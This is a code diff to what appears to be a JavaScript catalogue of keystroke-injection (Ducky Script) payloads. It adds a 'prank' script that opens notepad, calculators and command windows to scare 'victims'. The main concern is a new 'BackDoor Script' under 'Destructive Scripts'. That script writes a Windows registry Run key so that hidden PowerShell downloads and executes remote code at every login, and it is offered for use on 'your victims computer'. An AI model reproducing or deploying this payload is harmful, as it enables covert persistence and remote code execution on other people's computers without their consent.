@@ -323,6 +323,58 @@
                     language: "prank",
                     code: "GUI\nSTRING cmd\nDELAY 500\nENTER\nDELAY 1500\nSTRING cd C:\ \nENTER\nSTRING color a\nENTER\nSTRING tree\nENTER",
                     description: "Makes you look like a hacker, but we all know you aren't.\nDEMO: https://www.tiktok.com/@feds.wtf/video/7461748066786250016"
+                },
+                                {
+                    id: "slight-scare",
+                    title: "Slight Scare Script",
+                    language: "prank",
+                    code: """REM Made by CyberScripter
+DELAY 500
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 500
+STRING You shouldn't have done that...
+ENTER
+DELAY 500
+STRING But it's too late now.
+ENTER
+DELAY 500
+STRING Watch this.
+ENTER
+DELAY 1000
+
+REM Start opening calculators repeatedly
+LOOP 5
+    GUI r
+    DELAY 200
+    STRING calc
+    ENTER
+    DELAY 300
+ENDLOOP
+
+REM Open and close Command Prompt multiple times
+LOOP 3
+    GUI r
+    DELAY 200
+    STRING cmd
+    ENTER
+    DELAY 500
+    STRING exit
+    ENTER
+    DELAY 300
+ENDLOOP
+
+REM Open Notepad again for dramatic effect
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 500
+STRING Just kidding! Or am I...?
+ENTER""",
+                    description: "This script is made to scare your victims"
                 }
             ],
             "Utility Scripts": [
@@ -330,7 +382,13 @@
 
             ],
             "Destructive Scripts": [
-
+                {
+                    id: "backdoor",
+                    title: "BackDoor Script",
+                    language: "destructive",
+                    code: "REM made by D3CRYPT - This is a windows hidden backdoor script THIS IS A DANGEROUS SCRIPT\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell \nENTER\nDELAY 1000\nSTRING New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'backdoor' -Value 'powershell -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('REPLACE THIS TEXT WITH LINK')' -PropertyType String -Force\nENTER",
+                    description: "This installs a backdoor on your victims computer. USE RESPONSIBLY."
+                }
             ]
         };
 
